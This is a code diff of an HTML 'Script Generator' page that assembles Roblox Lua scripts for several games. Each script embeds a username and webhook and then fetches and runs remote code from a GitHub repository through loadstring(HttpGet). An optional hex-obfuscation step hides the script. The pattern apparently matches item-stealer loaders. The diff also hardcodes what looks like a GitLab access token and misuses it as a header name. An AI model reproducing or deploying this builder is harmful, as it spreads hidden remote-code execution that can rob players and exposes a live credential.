@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -52,114 +53,123 @@
 <body>
     <h1>Script Generator</h1>
     <div class="container">
-        <input type="text" id="username" placeholder="Enter your Username">
+        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        <input type="text" id="pat" placeholder="Enter GitHub PAT (optional)">
+        <input type="text" id="pat" placeholder="Enter GitLab PAT">
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
-            <option value="Murder Mystery 2">Murder Mystery 2</option>
-            <option value="Adopt Me">Adopt Me</option>
+            <option value="Murder Mystery 2 (patched)">Murder Mystery 2</option>
+            <option value="Adopt Me (Not tested)">Adopt Me</option>
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
         <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
+
     <script>
+        // Loadstrings for different games
         let loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
             "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
             "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
             "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };function hexEncode(script) {
-        return script.split('').map((c, i) => {
-            let hex = c.charCodeAt(0).toString(16);
-            let rand = Math.floor(Math.random() * 9);
-            return `\z${hex}${rand}`;
-        }).join('');
-    }
+        };
 
-    function wrapInDecoder(hexString) {
-        return `loadstring((function()
-            local hex = '${hexString}'
-            local decoded = ''
-            for h in hex:gmatch('\\z(%x%x)%d') do
-                decoded = decoded .. string.char(tonumber(h, 16))
-            end
-            return decoded
-        end)())()`;
-    }
-
-    function obfuscateScript(script) {
-        let hex = hexEncode(script);
-        return wrapInDecoder(hex);
-    }
-
-    function generateScript() {
-        let username = document.getElementById('username').value;
-        let webhook = document.getElementById('webhook').value;
-        let pat = document.getElementById('pat').value;
-        let selectedScript = document.getElementById('script-select').value;
-        let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
-
-        if (!username || !webhook) {
-            alert("Please enter both Username and Webhook URL!");
-            return;
+        // Hex obfuscation functions
+        function hexEncode(script) {
+            return script.split('').map((c) => {
+                let hex = c.charCodeAt(0).toString(16);
+                let rand = Math.floor(Math.random() * 9);
+                return `\\z${hex}${rand}`;
+            }).join('');
         }
 
-        let script = `Username = "${username}"
-
-Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
-
-if (autoObfuscate) {
-            script = obfuscateScript(script);
+        function wrapInDecoder(hexString) {
+            return `loadstring((function()
+                local hex = '${hexString}'
+                local decoded = ''
+                for h in hex:gmatch('\\\\z(%x%x)%d') do
+                    decoded = decoded .. string.char(tonumber(h, 16))
+                end
+                return decoded
+            end)())()`;
         }
 
-        if (pat) {
-            uploadToGitHub(script, selectedScript, pat);
-        } else {
-            downloadScript(script);
+        function obfuscateScript(script) {
+            let hex = hexEncode(script);
+            return wrapInDecoder(hex);
         }
-    }
 
-    function downloadScript(content) {
-        let blob = new Blob([content], { type: "text/plain" });
-        let a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "generated_script.txt";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }
+        // Main generate script function
+        function generateScript() {
+            let username = document.getElementById('username').value;
+            let webhook = document.getElementById('webhook').value;
+            let pat = document.getElementById('pat').value;
+            let selectedScript = document.getElementById('script-select').value;
+            let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
 
-    function uploadToGitHub(content, scriptName, pat) {
-        let filename = `Void${scriptName}`;
-        fetch(`https://api.github.com/repos/Goldded/Void2/contents/${filename}`, {
-            method: 'PUT',
-            headers: {
-                'Authorization': 'Bearer ' + pat,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                message: 'Add new script',
-                content: btoa(content)
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.content) {
-                alert("Script uploaded successfully!");
-            } else {
-                alert("Failed to upload. Check your PAT and repo permissions.");
+            if (!username || !webhook) {
+                alert("Please enter both Username and Webhook URL!");
+                return;
             }
-        })
-        .catch(error => {
-            console.error('Error uploading:', error);
-            alert("Error uploading script! Check console for details.");
-        });
-    }
-</script>
+
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;
+
+            if (autoObfuscate) {
+                script = obfuscateScript(script);
+            }
+
+            if (pat) {
+                uploadToGitLab(script, selectedScript, pat);
+            } else {
+                downloadScript(script);
+            }
+        }
+
+        // Download script locally
+        function downloadScript(content) {
+            let blob = new Blob([content], { type: "text/plain" });
+            let a = document.createElement("a");
+            a.href = URL.createObjectURL(blob);
+            a.download = "generated_script.txt";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        // GitLab Upload Function
+        function uploadToGitLab(content, scriptName, pat) {
+            let projectID = '67450323'; // Replace with your GitLab project ID
+            let filename = `Void${scriptName}.lua`;
+
+            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(projectID)}/repository/files/${encodeURIComponent(filename)}`, {
+                method: 'POST',
+                headers: {
+                    'glpat-8si5orFgbXbJE4uzHwKS': pat,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    branch: 'main',
+                    content: btoa(content),
+                    commit_message: 'Add new script'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.file_path) {
+                    alert("Script uploaded successfully to GitLab!");
+                } else {
+                    alert("Failed to upload. Check your PAT and project ID.");
+                }
+            })
+            .catch(error => {
+                console.error('Error uploading:', error);
+                alert("Error uploading script! Check console for details.");
+            });
+        }
+    </script>
 
 </body>
 </html>
